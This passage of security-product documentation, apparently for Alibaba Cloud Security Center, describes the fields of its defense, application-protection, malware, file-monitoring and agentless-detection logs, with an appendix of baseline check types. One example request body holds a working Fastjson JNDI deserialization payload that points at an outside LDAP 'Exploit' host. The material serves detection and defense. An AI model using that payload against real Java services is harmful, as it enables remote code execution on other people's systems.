The requirement ID. You can call the [ListCheckStandard](/help/en/security-center/developer-reference/api-sas-2018-12-03-listcheckstandard#main-107864) operation to obtain the ID.

5

risk\_level

The risk level. Valid values:

-   **LOW**
    
-   **MEDIUM**
    
-   **HIGH**
    

MEDIUM

section\_id

The section ID. You can call the [ListCheckResult](/help/en/security-center/developer-reference/api-sas-2018-12-03-listcheckresult#main-107864) operation to obtain the ID.

1

standard\_id

The standard ID. You can call the [ListCheckStandard](/help/en/security-center/developer-reference/api-sas-2018-12-03-listcheckstandard#main-107864) operation to obtain the ID.

1

status

The status of the check item. Valid values:

-   **NOT\_CHECK**: Not checked
    
-   **CHECKING**: Checking
    
-   **PASS**: Passed
    
-   **NOT\_PASS**: Failed
    
-   **WHITELIST**: Whitelisted
    

PASS

vendor

The cloud service provider. The value is fixed to ALIYUN.

ALIYUN

start\_time

The start timestamp in seconds. This also indicates the time when the event occurred.

1719472214

### Network defense logs

**Field Name**

**Description**

**Example**

cmd

The command line of the attacked process.

nginx: master process nginx

cur\_time

The time when the attack event occurred.

2023-09-14 09:21:59

decode\_payload

The payload converted from HEX format to characters.

POST /Services/FileService/UserFiles/

dst\_ip

The IP address of the attacked asset.

172.16.XX.XX

dst\_port

The port of the attacked asset.

80

func

The type of the intercepted event. Valid values:

-   **payload**: Malicious payload type. This indicates that the attack event was intercepted because malicious data or instructions were detected.
    
-   **tuple**: Malicious IP type. This indicates that the attack event was intercepted because malicious IP access was detected.
    

payload

rule\_type

The specific rule type of the intercepted event. Valid values:

-   **alinet\_payload**: The **payload** event defense rule specified by Security Center.
    
-   **alinet\_tuple**: The **tuple** event defense rule specified by Security Center.
    

alinet\_payload

instance\_id

The instance ID of the attacked asset.

i-2zeg4zldn8zypsfg\*\*\*\*

internet\_ip

The public IP address of the attacked asset.

39.104.XX.XX

intranet\_ip

The private IP address of the attacked asset.

192.168.XX.XX

final\_action

Defense action pattern. Value: block (intercepted).

block

payload

The payload in HEX format.

504f5354202f20485454502f312e310d0a436f6e74656e742d547970653a20746578742f706c61696e0d0a557365722d4167656e743a20\*\*\*\*

pid

The ID of the attacked process.

7107

platform

The system type of the attacked asset. Valid values:

-   **windows**
    
-   **linux**
    

linux

proc\_path

The path of the attacked process.

/usr/sbin/nginx

sas\_group\_name

The asset group of the server in Security Center.

default

src\_ip

The source IP address of the attack.

106.11.XX.XX

src\_port

The source port that initiated the attack.

29575

uuid

The UUID of the server.

5d83b26b-b7ca-4a0a-9267-12\*\*\*\*

start\_time

The start timestamp, in seconds. This also indicates when the event occurred.

1719472214

### **Application protection logs**

**Field Name**

**Description**

**Example**

app\_dir

The directory where the application resides.

/usr/local/aegis/rasp/apps/1111

app\_id

The application ID.

6492a391fc9b4e2aad94\*\*\*\*

app\_name

The name of the application.

test

confidence\_level

The confidence level of the detection algorithm. Valid values:

-   **high**
    
-   **medium**
    
-   **low**
    

low

request\_body

The request body.

{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://172.220.XX.XX:1389/Exploit","autoCommit":true}

request\_content\_length

The length of the request body.

112

data

The hook point parameters.

{"cmd":"bash -c kill -0 -- -'31098' "}

headers

The request header.

{"content-length":"112","referer":"http://120.26.XX.XX:8080/demo/Serial","accept-language":"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2","origin":"http://120.26.XX.XX:8080","host":"120.26.XX.XX:8080","content-type":"application/json","connection":"keep-alive","x-forwarded-for":"1.1.XX.XX","accept-encoding":"gzip, deflate","user-agent":"msnbot","accept":"application/json, text/plain, \*/\*"}

hostname

The name of the host or network device.

testhostname

host\_ip

The private IP address of the host.

172.16.XX.XX

is\_cliped

Indicates whether the log was truncated because it was too long. Valid values:

-   **true**: Truncated
    
-   **false**: Not truncated
    

false

jdk\_version

The JDK version.

1.8.0\_292

message

The alert description.

Unsafe class serial.

request\_method

The request method.

Post

platform

The operating system type.

Linux

arch

The operating system architecture.

amd64

kernel\_version

The operating system kernel version.

3.10.0-1160.59.1.el7.x86\_64

param

The request parameters. Common formats include the following:

-   GET parameters
    
-   application/x-www-form-urlencoded
    

{"url":\["http://127.0.0.1.xip.io"\]}

payload

An effective attack payload.

bash -c kill -0 -- -'31098'

payload\_length

The length of the attack payload.

27

rasp\_id

The unique ID of the application protection probe.

fa00223c8420e256c0c98ca0bd0d\*\*\*\*

rasp\_version

The version of the application protection probe.

0.8.5

src\_ip

The IP address of the requester.

172.0.XX.XX

final\_action

The result of how the alert is handled. Valid values:

-   **block**: Protection through blocking.
    
-   **monitor**: Monitoring.
    

block

rule\_action

The alert handling method specified by the rule. Valid values:

-   **block**
    
-   **monitor**
    

block

risk\_level

The risk level. Valid values:

-   **High**
    
-   **medium**
    
-   **low**
    

high

stacktrace

The stack information.

\[java.io.FileInputStream.<init>(FileInputStream.java:123), java.io.FileInputStream.<init>(FileInputStream.java:93), com.example.vulns.controller.FileController.IORead(FileController.java:75), sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method), sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)......\]

time

The time when the alert was triggered.

2023-10-09 15:19:15

timestamp

The timestamp when the alert was triggered, in milliseconds.

1696835955070

type

The attack type. Valid values:

-   **attach**: Malicious attachment.
    
-   **beans**: Malicious beans binding
    
-   **classloader**: Malicious class loading
    
-   **dangerous\_protocol**: Use of a dangerous protocol
    
-   **dns**: Malicious DNS query
    
-   **engine**: Engine injection
    
-   **expression**: Expression injection
    
-   **file**: Malicious file read/write
    
-   **file\_delete**: Arbitrary file deletion
    
-   **file\_list**: Directory traversal
    
-   **file\_read**: Arbitrary file read
    
-   **file\_upload**: Malicious file upload
    
-   **jndi**: JNDI injection
    
-   **jni**: JNI injection
    
-   **jstl**: JSTL arbitrary file inclusion
    
-   **memory\_shell**: In-memory webshell injection
    
-   **rce**: Remote code execution
    
-   **read\_object**: Deserialization attack
    
-   **reflect**: Malicious reflection call
    
-   **sql**: SQL injection
    
-   **ssrf**: Malicious outbound connection
    
-   **thread\_inject**: Thread injection
    
-   **xxe**: XXE attack
    

rce

url

The request URL.

http://127.0.0.1:999/xxx

rasp\_attack\_uuid

The UUID of the attack event.

18823b23-7ad4-47c0-b5ac-e5f036a2\*\*\*\*

uuid

The host UUID.

23f7ca61-e271-4a8e-bf5f-165596a16\*\*\*\*

internet\_ip

The public IP address of the host.

1.2.XX.XX

intranet\_ip

The private IP address of the host.

172.16.XX.XX

sas\_group\_name

The name of the server group in Security Center.

Group 1

instance\_id

The host instance ID.

i-wz995eivg28f1m\*\*

start\_time

The start timestamp, in seconds. This also indicates the time when the event occurred.

1719472214

### **Malware detection logs**

**Field Name**

**Description**

**Example**

bucket\_name

The bucket name.

\*\*\*-test

event\_id

The alert ID.

802210

event\_name

The alert name.

Mining program

md5

The MD5 hash of the file.

6bc2bc\*\*\*\*\*\*53d409b1

sha256

The SHA256 hash of the file.

f038f9525\*\*\*\*\*\*7772981e87f85

result

The detection result. Valid values:

-   0: The file is safe.
    
-   1: A malicious file exists.
    

0

file\_path

The file path.

test.zip/bin\_test

etag

The OSS file identifier.

6BC2B\*\*\*\*\*\*853D409B1

risk\_level

The risk level. Valid values:

-   serious: Urgent
    
-   suspicious: Suspicious
    
-   remind: Reminder
    

remind

source

The detection scenario. Valid values:

-   OSS: A detection of files in an Alibaba Cloud Object Storage Service bucket was performed in the Security Center console.
    
-   API: Detect malicious files by integrating the SDK using Java or Python.
    

OSS

parent\_md5

The MD5 hash of the parent class file or compressed package.

3d0f8045bb9\*\*\*\*\*\*

parent\_sha256

The SHA256 hash of the parent file or compressed package.

69b643d6\*\*\*\*\*\*a3fb859fa

parent\_file\_path

The name of the parent file or compressed package.

test.zip

start\_time

The start timestamp, in seconds. This also indicates the time when the event occurred.

1719472214

compress\_file\_number

Compressed package file ordinal number, in the format `[current file ordinal number]/[total number of files]`.

1/10: The archive contains 10 files. This is file 1.

### **Core file monitoring event logs**

**Field Name**

**Description**

**Example**

start\_time

The most recent time the event occurred. Unit: seconds.

1718678414

uuid

The UUID of the agent.

5d83b26b-b\*\*a-4\*\*a-9267-12\*\*\*\*

file\_path

The file path.

/etc/passwd

proc\_path

The process path.

/usr/bin/bash

rule\_id

The ID of the rule that was hit.

123

rule\_name

The rule name.

file\_test\_rule

cmdline

The command line.

bash /opt/a

operation

The operation on the file.

READ

risk\_level

The alert level.

2

pid

The process ID.

45324

proc\_permission

The process permissions.

rwxrwxrwx

instance\_id

The instance ID.

i-wz995eivg2\*\*\*\*

internet\_ip

The public IP address.

192.0.2.1

intranet\_ip

The private IP address.

172.16.0.1

instance\_name

The instance name.

aegis-test

platform

The operating system type.

Linux

### **Agentless detection logs**

#### **Common fields for vulnerabilities, baselines, and malicious samples**

**Field name**

**Description**

**Example**

uuid

The server UUID.

ad66133a-dc82-4e5e-9659-a49e3\*\*\*\*

instance\_id

The instance ID.

i-2zeg4zldn8zypsfg\*\*\*\*

internet\_ip

The public IP address of the asset.

39.104.XX.XX

intranet\_ip

The private IP address of the asset.

192.168.XX.XX

sas\_group\_name

The asset group of the server in Security Center.

default

start\_time

The start timestamp in seconds. This also indicates the time when the event occurred.

1719472214

#### **Vulnerability risk fields**

**Field Name**

**Description**

**Example**

vul\_name

The name of the vulnerability.

imgsca:java:gson:AVD-2022-25647

vul\_alias\_name

The alias of the vulnerability.

gson code issue vulnerability (CVE-2022-25647)

vul\_primary\_id

The primary key ID of the vulnerability.

990174361

type

The vulnerability type. Valid values:

-   sys: Windows system vulnerability
    
-   cve: Linux software vulnerability
    
-   sca: Application vulnerability (software component analysis type)
    
-   emg: Urgent vulnerability
    

sca

alert\_level

The risk level of the vulnerability. Valid values:

-   **asap**: High
    
-   **Later**: Medium
    
-   **nntf**: Low
    

asap

instance\_name

The hostname.

hhht-linux-\*\*\*

operation

The action performed on the vulnerability. Valid values:

-   new: New
    
-   update: Updated
    

new

status

The status information of the vulnerability. Valid values:

-   1: Unfixed
    
-   7: Fixed
    

1

tag

The tag of the vulnerability. Valid values:

-   oval: Linux software vulnerability
    
-   system: Windows system vulnerability
    

**Note**

The tags for other vulnerability types are random strings.

oval

#### **Baselinecheck fields**

**Field name**

**Description**

**Example**

check\_item\_name

The name of the check item.

Set password expiration time

check\_item\_level

The risk level of the check item. Valid values:

-   **high**: High
    
-   **medium**: Medium
    
-   **low**: Low
    

high

check\_type

The type of the check item.

Identity authentication

risk\_level

The risk level of the risk item. Valid values:

-   **high**: High
    
-   **medium**: Medium
    
-   **low**: Low
    

low

operation

The operation. Valid values:

-   new: New
    
-   update: Updated
    

new

risk\_name

The name of the risky check item.

Password policy compliance check

status

The status of the check item. Valid values:

-   1: Failed
    
-   3: Passed
    

1

sub\_type\_alias\_name

The alias of the subtype.

Alibaba Cloud standard - CentOS Linux 7/8 security baseline

sub\_type\_name

The name of the baseline subtype. For more information about the valid values of the baseline subtype, see [List of baseline types and subtypes](#p-uzz-z9n-y7e).

hc\_centos7

type\_name

The type name.

hc\_best\_secruity

type\_alias\_name

The alias of the type.

Best practices

container\_id

The container ID.

b564567427272d46f9b1cc4ade06a85fdf55075c06fdb870818d5925fa86\*\*\*\*

container\_name

The container name.

k8s\_gamify-answer-bol\_gamify-answer-bol-5-6876d5dc78-vf6rb\_study-gamify-answer-bol\_483a1ed1-28b7-11eb-bc35-00163e01\*\*\*\*\_0

#### **Malicious sample fields**

**Field name**

**Description**

**Example**

alert\_level

The risk level of the alert event. Valid values:

-   serious: Urgent
    
-   Suspicious
    
-   remind: Reminder
    

suspicious

alert\_name

The name of the malicious sample alert.

Suspicious Process - SSH-based

operation

The operation. Valid values:

-   new: New
    
-   update: Updated
    

new

status

The risk status of the malicious sample. Valid values:

-   0: Unhandled
    
-   3: Whitelisted
    

0

suspicious\_event\_id

The alert event ID.

909361

#### **Sensitive file fields**

**Field name**

**Description**

**Example**

alert\_level

The risk level. Valid values:

-   high: High
    
-   medium: Medium
    
-   low: Low
    

high

rule\_name

The file type name.

Ionic token

file\_path

The path of the sensitive file.

/Windows/Microsoft.NET/assembly/GAC\_MSIL/System.WorkflowServices/v4.0\_4.0.0.0\_\_31bf3856ad36\*\*\*\*/System.WorkflowServices.dll

result

The check result.

{"result":"\[\\"\[\\\\\\"mysql-uqjtwadmin-xxx"}

## **Appendix**

### List of baseline types and subtypes

**Type name**

**Subtype name**

**Description**

hc\_exploit

hc\_exploit\_redis

Important threat exploit: Unauthorized access to Redis

hc\_exploit\_activemq

Important threat exploit: Unauthorized access to ActiveMQ

hc\_exploit\_couchdb

Important threat exploit: Unauthorized access to CouchDB

hc\_exploit\_docker

Important threat exploit: Unauthorized access to Docker

hc\_exploit\_es

Important threat exploit: Unauthorized access to Elasticsearch

hc\_exploit\_hadoop

Important threat exploit: Unauthorized access to Hadoop

hc\_exploit\_jboss

Important threat exploit: Unauthorized access to JBoss

hc\_exploit\_jenkins

Important threat exploit: Unauthorized access to Jenkins

hc\_exploit\_k8s\_api

Important threat exploit: Unauthorized access to Kubernetes API server

hc\_exploit\_ldap

Important threat exploit: Unauthorized access to LDAP (Windows environment)

hc\_exploit\_ldap\_linux

Important threat exploit: Unauthorized access to OpenLDAP (Linux environment)

hc\_exploit\_memcache

Important threat exploit: Unauthorized access to Memcached

hc\_exploit\_mongo

Important threat exploit: Unauthorized access to MongoDB

hc\_exploit\_pgsql

Important: Threat Exploitation—PostgreSQL Unauthorized Access Baseline

hc\_exploit\_rabbitmq

Important threat exploit: Unauthorized access to RabbitMQ

hc\_exploit\_rsync

Important threat exploit: Unauthorized access to rsync

hc\_exploit\_tomcat

Important threat exploit: Apache Tomcat AJP file inclusion vulnerability

hc\_exploit\_zookeeper

Important threat exploit: Unauthorized access to ZooKeeper

hc\_container

hc\_docker

Alibaba Cloud standard: Docker security baseline check

hc\_middleware\_ack\_master

International security best practices: Kubernetes (ACK) master node security baseline check

hc\_middleware\_ack\_node

International security best practices: Kubernetes (ACK) node security baseline check

hc\_middleware\_k8s

Alibaba Cloud standard: Kubernetes master node security baseline check

hc\_middleware\_k8s\_node

Alibaba Cloud standard: Kubernetes node security baseline check

cis

hc\_suse 15\_djbh

MLPS 2.0 Level 3: SUSE 15 compliance baseline check

hc\_aliyun\_linux3\_djbh\_l3

MLPS 2.0 Level 3: Alibaba Cloud Linux 3 compliance baseline check

hc\_aliyun\_linux\_djbh\_l3

MLPS 2.0 Level 3: Alibaba Cloud Linux/Aliyun Linux 2 compliance baseline check

hc\_bind\_djbh

MLPS 2.0 Level 3: Bind compliance baseline check

hc\_centos 6\_djbh\_l3

MLPS 2.0 Level 3: CentOS Linux 6 compliance baseline check

hc\_centos 7\_djbh\_l3

MLPS 2.0 Level 3: CentOS Linux 7 compliance baseline check

hc\_centos 8\_djbh\_l3

MLPS 2.0 Level 3: CentOS Linux 8 compliance baseline check

hc\_debian\_djbh\_l3

MLPS 2.0 Level 3: Debian Linux 8/9/10 compliance baseline check

hc\_iis\_djbh

MLPS 2.0 Level 3: IIS compliance baseline check

hc\_informix\_djbh

MLPS 2.0 Level 3: Informix compliance baseline check

hc\_jboss\_djbh

MLPS 2.0 Level 3: JBoss compliance baseline check

hc\_mongo\_djbh

MLPS 2.0 Level 3: MongoDB compliance baseline check

hc\_mssql\_djbh

MLPS 2.0 Level 3: SQL Server compliance baseline check

hc\_mysql\_djbh

MLPS 2.0 Level 3: MySQL compliance baseline check

hc\_nginx\_djbh

MLPS 2.0 Level 3: Nginx compliance baseline check

hc\_oracle\_djbh

MLPS 2.0 Level 3: Oracle compliance baseline check

hc\_pgsql\_djbh

MLPS 2.0 Level 3: PostgreSQL compliance baseline check

hc\_redhat 6\_djbh\_l3

MLPS 2.0 Level 3: Red Hat Linux 6 compliance baseline check

hc\_redhat\_djbh\_l3

MLPS 2.0 Level 3: Red Hat Linux 7 compliance baseline check

hc\_redis\_djbh

MLPS 2.0 Level 3: Redis compliance baseline check

hc\_suse 10\_djbh\_l3

MLPS 2.0 Level 3: SUSE 10 compliance baseline check

hc\_suse 12\_djbh\_l3

MLPS 2.0 Level 3: SUSE 12 compliance baseline check

hc\_suse\_djbh\_l3

MLPS 2.0 Level 3: SUSE 11 compliance baseline check

hc\_ubuntu 14\_djbh\_l3

MLPS 2.0 Level 3: Ubuntu 14 compliance baseline check

hc\_ubuntu\_djbh\_l3

MLPS 2.0 Level 3: Ubuntu 16/18/20 compliance baseline check

hc\_was\_djbh

MLPS 2.0 Level 3: Websphere Application Server compliance baseline check

hc\_weblogic\_djbh

MLPS 2.0 Level 3: WebLogic compliance baseline check

hc\_win 2008\_djbh\_l3

MLPS 2.0 Level 3: Windows 2008 R2 compliance baseline check

hc\_win 2012\_djbh\_l3

MLPS 2.0 Level 3: Windows 2012 R2 compliance baseline check

hc\_win 2016\_djbh\_l3

MLPS 2.0 Level 3: Windows 2016/2019 compliance baseline check

hc\_aliyun\_linux\_djbh\_l2

MLPS 2.0 Level 2: Alibaba Cloud Linux/Aliyun Linux 2 compliance baseline check

hc\_centos 6\_djbh\_l2

MLPS 2.0 Level 2: CentOS Linux 6 compliance baseline check

hc\_centos 7\_djbh\_l2

MLPS 2.0 Level 2: CentOS Linux 7 compliance baseline check

hc\_debian\_djbh\_l2

MLPS 2.0 Level 2: Debian Linux 8 compliance baseline check

hc\_redhat 7\_djbh\_l2

MLPS 2.0 Level 2: Red Hat Linux 7 compliance baseline check

hc\_ubuntu\_djbh\_l2

MLPS 2.0 Level 2: Ubuntu 16/18 compliance baseline check

hc\_win 2008\_djbh\_l2

MLPS 2.0 Level 2: Windows 2008 R2 compliance baseline check

hc\_win 2012\_djbh\_l2

MLPS 2.0 Level 2: Windows 2012 R2 compliance baseline check

hc\_win 2016\_djbh\_l2

MLPS 2.0 Level 2: Windows 2016/2019 compliance baseline check

hc\_aliyun\_linux\_cis

International security best practices: Alibaba Cloud Linux/Aliyun Linux 2 security baseline check

hc\_centos 6\_cis\_rules

International security best practices: CentOS Linux 6 security baseline check

hc\_centos 7\_cis\_rules

International security best practices: CentOS Linux 7 security baseline check

hc\_centos 8\_cis\_rules

International security best practices: CentOS Linux 8 security baseline check

hc\_debian 8\_cis\_rules

International security best practices: Debian Linux 8 security baseline check

hc\_ubuntu 14\_cis\_rules

International security best practices: Ubuntu 14 security baseline check

hc\_ubuntu 16\_cis\_rules

International security best practices: Ubuntu 16/18/20 security baseline check

hc\_win 2008\_cis\_rules

International security best practices: Windows Server 2008 R2 security baseline check

hc\_win 2012\_cis\_rules

International security best practices: Windows Server 2012 R2 security baseline check

hc\_win 2016\_cis\_rules

International security best practices: Windows Server 2016/2019 R2 security baseline check

hc\_kylin\_djbh\_l3

MLPS 2.0 Level 3: Kylin compliance baseline check

hc\_uos\_djbh\_l3

MLPS 2.0 Level 3: UOS compliance baseline check

hc\_best\_security

hc\_aliyun\_linux

Alibaba Cloud standard: Alibaba Cloud Linux/Aliyun Linux 2 security baseline check

hc\_centos 6

Alibaba Cloud standard: CentOS Linux 6 security baseline check

hc\_centos 7

Alibaba Cloud standard: CentOS Linux 7/8 security baseline check

hc\_debian

Alibaba Cloud standard: Debian Linux 8/9/10 security baseline check

hc\_redhat 6

Alibaba Cloud standard: Red Hat Linux 6 security baseline check

hc\_redhat 7

Alibaba Cloud standard: Red Hat Linux 7/8 security baseline check

hc\_ubuntu

Alibaba Cloud standard: Ubuntu security baseline check

hc\_windows\_2008

Alibaba Cloud standard: Windows 2008 R2 security baseline check

hc\_windows\_2012

Alibaba Cloud standard: Windows 2012 R2 security baseline check

hc\_windows\_2016

Alibaba Cloud standard: Windows 2016/2019 security baseline check

hc\_db\_mssql

Alibaba Cloud standard: SQL Server security baseline check

hc\_memcached\_ali

Alibaba Cloud standard: Memcached security baseline check

hc\_mongodb

Alibaba Cloud standard: MongoDB 3.x security baseline check

hc\_mysql\_ali

Alibaba Cloud standard: MySQL security baseline check

hc\_oracle

Alibaba Cloud standard: Oracle 11g security baseline check

hc\_pgsql\_ali

Alibaba Cloud standard: PostgreSQL security baseline check

hc\_redis\_ali

Alibaba Cloud standard: Redis security baseline check

hc\_apache

Alibaba Cloud standard: Apache security baseline check

hc\_iis\_8

Alibaba Cloud standard: IIS 8 security baseline check

hc\_nginx\_linux

Alibaba Cloud standard: Nginx security baseline check

hc\_suse 15

Alibaba Cloud standard: SUSE Linux 15 security baseline check

tomcat 7

Alibaba Cloud standard: Apache Tomcat security baseline check

weak\_password

hc\_mongodb\_pwd

Weak password: MongoDB logon weak password detection (supports version 2.x)

hc\_weakpwd\_ftp\_linux

Weak password: FTP logon weak password check

hc\_weakpwd\_linux\_sys

Weak password: Linux system logon weak password check

hc\_weakpwd\_mongodb 3

Weak password: MongoDB logon weak password detection

hc\_weakpwd\_mssql

Weak password: SQL Server database logon weak password check

hc\_weakpwd\_mysql\_linux

Weak password: MySQL database logon weak password check

hc\_weakpwd\_mysql\_win

Weak password: MySQL database logon weak password check (Windows)

hc\_weakpwd\_openldap

Weak password: OpenLDAP logon weak password check

hc\_weakpwd\_oracle

Weak password: Oracle logon weak password detection

hc\_weakpwd\_pgsql

Weak password: PostgreSQL database logon weak password check

hc\_weakpwd\_pptp

Weak password: pptpd service logon weak password check

hc\_weakpwd\_redis\_linux

Weak password: Redis database logon weak password check

hc\_weakpwd\_rsync

Weak password: rsync service logon weak password check

hc\_weakpwd\_svn

Weak password: SVN service logon weak password check

hc\_weakpwd\_tomcat\_linux

Weak password: Apache Tomcat console weak password check

hc\_weakpwd\_vnc

Weak password: VNC Server weak password check

hc\_weakpwd\_weblogic

Weak password: WebLogic 12c logon weak password detection

hc\_weakpwd\_win\_sys

Weak password: Windows system logon weak password check
